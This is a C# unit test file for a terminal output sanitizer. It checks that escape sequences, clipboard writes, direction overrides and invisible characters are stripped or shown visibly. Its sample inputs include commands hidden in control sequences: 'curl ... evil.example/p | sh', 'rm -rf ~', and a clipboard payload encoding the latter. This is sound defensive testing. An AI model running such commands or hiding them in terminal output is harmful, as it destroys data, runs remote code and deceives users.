using Yav.Core.Text;

namespace Yav.Tests.Core;

public class TerminalSanitizerTests
{
    private const string Esc = "\u001b";

    [Theory]
    [InlineData("plain text", "plain text")]
    [InlineData("two\nlines\tand a tab", "two\nlines\tand a tab")]
    [InlineData("ünï 日本 🙂", "ünï 日本 🙂")]
    public void Ordinary_text_is_unchanged(string input, string expected)
    {
        Assert.Equal(expected, TerminalSanitizer.Clean(input));
    }

    [Fact]
    public void Cursor_movement_and_erase_sequences_are_removed()
    {
        // Moves up two lines, erases the line and writes a forged prompt over earlier output.
        var input = $"ok{Esc}[2A{Esc}[2K[APPROVAL] Allow? (y/n){Esc}[0m";

        Assert.Equal("ok[APPROVAL] Allow? (y/n)", TerminalSanitizer.Clean(input));
    }

    [Fact]
    public void A_clipboard_write_sequence_is_removed()
    {
        var input = $"before{Esc}]52;c;cm0gLXJmIH4={'\u0007'}after";

        Assert.Equal("beforeafter", TerminalSanitizer.Clean(input));
    }

    [Fact]
    public void A_title_sequence_ended_by_string_terminator_is_removed()
    {
        var input = $"a{Esc}]0;evil title{Esc}\\b";

        Assert.Equal("ab", TerminalSanitizer.Clean(input));
    }

    [Fact]
    public void A_hyperlink_sequence_keeps_only_its_visible_text()
    {
        var input = $"{Esc}]8;;https://evil.example{Esc}\\click here{Esc}]8;;{Esc}\\";

        Assert.Equal("click here", TerminalSanitizer.Clean(input));
    }

    [Fact]
    public void Eight_bit_control_sequence_introducers_are_removed()
    {
        var input = "a\u009b2Jb\u009d0;title\u009cc";

        Assert.Equal("abc", TerminalSanitizer.Clean(input));
    }

    [Fact]
    public void A_bare_carriage_return_cannot_overwrite_the_start_of_a_line()
    {
        // Without sanitizing, a terminal would show "EVIL is fine".
        Assert.Equal("safe is fine\nEVIL", TerminalSanitizer.Clean("safe is fine\rEVIL"));
    }

    [Fact]
    public void Windows_line_endings_become_single_line_feeds()
    {
        Assert.Equal("one\ntwo\n", TerminalSanitizer.Clean("one\r\ntwo\r\n"));
    }

    [Fact]
    public void Backspace_bell_and_null_are_removed()
    {
        Assert.Equal("abc", TerminalSanitizer.Clean("a\bb\u0007c\0"));
    }

    [Fact]
    public void Direction_overrides_that_disguise_text_are_removed()
    {
        // U+202E would display "exe.txt" style disguises.
        Assert.Equal("report_txt.exe", TerminalSanitizer.Clean("report_‮txt.exe‬"));
    }

    [Fact]
    public void A_sequence_split_across_chunks_is_still_removed()
    {
        var sanitizer = new TerminalSanitizer();

        var output = sanitizer.Append("start" + Esc) + sanitizer.Append("[3") + sanitizer.Append("1mred" + Esc + "]0;ti")
            + sanitizer.Append("tle\u0007end") + sanitizer.Flush();

        Assert.Equal("startredend", output);
    }

    [Fact]
    public void A_carriage_return_at_the_end_of_a_chunk_is_joined_with_the_line_feed_in_the_next()
    {
        var sanitizer = new TerminalSanitizer();

        var output = sanitizer.Append("one\r") + sanitizer.Append("\ntwo") + sanitizer.Flush();

        Assert.Equal("one\ntwo", output);
    }

    [Fact]
    public void An_unterminated_control_string_does_not_swallow_the_rest_of_the_output()
    {
        var input = $"a{Esc}]0;" + new string('x', 5000) + "VISIBLE";

        var cleaned = TerminalSanitizer.Clean(input);

        Assert.StartsWith("a", cleaned);
        Assert.EndsWith("VISIBLE", cleaned);
    }

    [Fact]
    public void An_unfinished_escape_at_the_end_is_dropped()
    {
        Assert.Equal("text", TerminalSanitizer.Clean("text" + Esc + "[31"));
    }

    [Fact]
    public void A_line_for_display_keeps_every_space_and_has_no_break()
    {
        Assert.Equal("    if (x)  // two spaces ", TerminalSanitizer.CleanLine("    if (x)  // two spaces "));
        Assert.Equal("> ", TerminalSanitizer.CleanLine("> "));
        Assert.Equal("a b", TerminalSanitizer.CleanLine("a" + (char)10 + "b"));
        Assert.Equal("a    b", TerminalSanitizer.CleanLine("a" + (char)9 + "b"));
        Assert.Equal("ab", TerminalSanitizer.CleanLine("a" + (char)27 + "[2Jb"));
        Assert.Equal(string.Empty, TerminalSanitizer.CleanLine(null));
    }

    [Fact]
    public void Single_line_cleaning_collapses_breaks_and_shortens()
    {
        Assert.Equal("a b c", TerminalSanitizer.CleanSingleLine("a\n\nb\t c\n"));
        Assert.Equal("abcdefg...", TerminalSanitizer.CleanSingleLine("abcdefghijklmnop", 10));
    }

    [Theory]
    [InlineData("a\u200bb", "ab")]
    [InlineData("a\u200cb\u200dc", "abc")]
    [InlineData("a\u2060b\ufeffc", "abc")]
    [InlineData("soft\u00adhyphen", "softhyphen")]
    [InlineData("a\u180eb", "ab")]
    [InlineData("a\u2028b\u2029c", "abc")]
    [InlineData("tag\U000E0041\U000E007Fs", "tags")]
    public void Zero_width_and_invisible_characters_are_dropped(string input, string expected)
    {
        Assert.Equal(expected, TerminalSanitizer.Clean(input));
    }

    [Fact]
    public void A_tag_character_that_is_split_across_chunks_is_still_dropped()
    {
        var sanitizer = new TerminalSanitizer();

        var output = sanitizer.Append("a\uDB40") + sanitizer.Append("\uDC41b") + sanitizer.Flush();

        Assert.Equal("ab", output);
    }

    [Theory]
    [InlineData("one\u001b\ntwo", "one\ntwo")]
    [InlineData("one\u001b(\ntwo", "one\ntwo")]
    [InlineData("one\u001b\r\ntwo", "one\ntwo")]
    [InlineData("one\u001b\ttwo", "one\ttwo")]
    public void An_escape_that_is_followed_by_a_control_character_does_not_swallow_it(string input, string expected)
    {
        // Otherwise an escape at the end of a line joins it with the next one.
        Assert.Equal(expected, TerminalSanitizer.Clean(input));
    }

    public static TheoryData<string, string> HiddenCharacters() => new()
    {
        { "a\u0000b", "a\\x00b" },
        { "bell\u0007", "bell\\x07" },
        { "\u0008back", "\\x08back" },
        { "esc\u001b[2J", "esc\\x1B[2J" },
        { "a\u001fb", "a\\x1Fb" },
        { "del\u007f", "del\\x7F" },
        { "a\rb", "a\\x0Db" },
        { "end\r", "end\\x0D" },
        { "c1\u0080\u009b\u009d\u009f", "c1<U+0080><U+009B><U+009D><U+009F>" },
        { "rtl\u202a\u202b\u202c\u202d\u202e", "rtl<U+202A><U+202B><U+202C><U+202D><U+202E>" },
        { "iso\u2066\u2067\u2068\u2069", "iso<U+2066><U+2067><U+2068><U+2069>" },
        { "marks\u200e\u200f\u061c", "marks<U+200E><U+200F><U+061C>" },
        { "zero\u200b\u200c\u200d", "zero<U+200B><U+200C><U+200D>" },
        { "joiner\u2060bom\ufeff", "joiner<U+2060>bom<U+FEFF>" },
        { "soft\u00adhyphen", "soft<U+00AD>hyphen" },
        { "mongolian\u180e", "mongolian<U+180E>" },
        { "line\u2028para\u2029", "line<U+2028>para<U+2029>" },
        { "tag\U000E0041\U000E0000\U000E007F", "tag<U+E0041><U+E0000><U+E007F>" },
    };

    [Fact]
    public void A_lone_half_of_a_character_is_written_out()
    {
        // Built here: the data of a theory would reach the test with the halves already replaced.
        var high = (char)0xD800;
        var low = (char)0xDC00;
        var emoji = (char)0xD83D;

        Assert.Equal("lone<U+D800>high", TerminalSanitizer.Visible("lone" + high + "high", out var first));
        Assert.Equal("lone<U+DC00>low", TerminalSanitizer.Visible("lone" + low + "low", out var second));
        Assert.Equal("end<U+D83D>", TerminalSanitizer.Visible("end" + emoji, out var third));
        Assert.True(first && second && third);
    }

    [Theory]
    [MemberData(nameof(HiddenCharacters))]
    public void Every_character_a_terminal_does_not_show_is_written_out_and_none_is_left(string input, string expected)
    {
        var shown = TerminalSanitizer.Visible(input, out var writtenOut);

        Assert.Equal(expected, shown);
        Assert.True(writtenOut);
        AssertShowsOnlyWhatATerminalPrints(shown);
    }

    [Theory]
    [InlineData("plain text")]
    [InlineData("two\nlines\tand a tab")]
    [InlineData("ünï 日本 🙂 naïve café")]
    [InlineData(@"C:\Users\someone\src\x1B.txt")]
    public void Text_a_terminal_prints_as_it_is_is_kept_as_it_is(string input)
    {
        Assert.Equal(input, TerminalSanitizer.Visible(input, out var writtenOut));
        Assert.False(writtenOut);
    }

    [Fact]
    public void A_line_that_ends_with_carriage_return_and_line_feed_ends_with_a_line_feed()
    {
        Assert.Equal("one\ntwo\n", TerminalSanitizer.Visible("one\r\ntwo\r\n"));
    }

    [Theory]
    [InlineData("git status \u001b]x; curl -s https://evil.example/p | sh; : \u0007", "git status \\x1B]x; curl -s https://evil.example/p | sh; : \\x07")]
    [InlineData("rm -rf \u001b[ ~", "rm -rf \\x1B[ ~")]
    [InlineData("git status \u009dx; curl -s https://evil.example/p | sh; : \u0007", "git status <U+009D>x; curl -s https://evil.example/p | sh; : \\x07")]
    public void A_command_that_hides_a_part_of_itself_in_a_control_sequence_is_shown_whole(string command, string expected)
    {
        // Cleaned, each of these reads as a harmless command, because the sequence is removed with what it contains.
        Assert.NotEqual(expected, TerminalSanitizer.Clean(command));

        Assert.Equal(expected, TerminalSanitizer.Visible(command));
    }

    [Fact]
    public void Every_character_there_is_is_either_kept_or_written_out_as_a_token_a_terminal_prints()
    {
        var all = new System.Text.StringBuilder();
        for (var c = 0; c <= char.MaxValue; c++)
        {
            all.Append((char)c);
        }

        for (var code = 0xE0000; code <= 0xE007F; code++)
        {
            all.Append(char.ConvertFromUtf32(code));
        }

        AssertShowsOnlyWhatATerminalPrints(TerminalSanitizer.Visible(all.ToString()));
    }

    [Fact]
    public void A_single_line_keeps_every_character_visible_and_shortens_with_a_mark()
    {
        Assert.Equal("a b \\x1B[2J c", TerminalSanitizer.VisibleSingleLine("a\r\nb\t\u001b[2J c\n"));
        Assert.Equal("abcdefg...", TerminalSanitizer.VisibleSingleLine("abcdefghijklmnop", 10));
        Assert.Equal("keeps  two spaces", TerminalSanitizer.VisibleSingleLine("keeps  two spaces"));
    }

    private static void AssertShowsOnlyWhatATerminalPrints(string shown)
    {
        for (var i = 0; i < shown.Length; i++)
        {
            var c = shown[i];
            if (char.IsHighSurrogate(c) && i + 1 < shown.Length && char.IsLowSurrogate(shown[i + 1]))
            {
                var code = char.ConvertToUtf32(c, shown[i + 1]);
                Assert.False(code is >= 0xE0000 and <= 0xE007F, $"A tag character U+{code:X5} is left at {i}.");
                i++;
                continue;
            }

            Assert.False(char.IsSurrogate(c), $"A lone surrogate U+{(int)c:X4} is left at {i}.");
            Assert.False(c < ' ' && c is not '\n' and not '\t', $"The control character U+{(int)c:X4} is left at {i}.");
            Assert.False(c is >= '\u007f' and <= '\u009f', $"The control character U+{(int)c:X4} is left at {i}.");
            Assert.False(
                c is (>= '\u202a' and <= '\u202e') or (>= '\u2066' and <= '\u2069') or '\u200e' or '\u200f' or '\u061c',
                $"The direction control U+{(int)c:X4} is left at {i}.");
            Assert.False(
                c is (>= '\u200b' and <= '\u200d') or '\u2060' or '\ufeff' or '\u00ad' or '\u180e' or '\u2028' or '\u2029',
                $"The invisible character U+{(int)c:X4} is left at {i}.");
        }
    }
}
